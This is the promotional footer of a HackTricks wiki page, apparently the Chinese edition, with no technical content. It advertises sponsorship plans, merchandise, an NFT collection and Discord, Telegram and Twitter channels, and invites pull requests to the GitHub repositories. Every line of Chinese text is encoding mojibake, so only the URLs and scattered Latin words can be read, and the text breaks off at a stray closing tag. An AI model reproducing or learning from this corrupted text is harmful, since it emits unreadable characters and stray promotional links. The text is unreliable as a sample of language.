* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
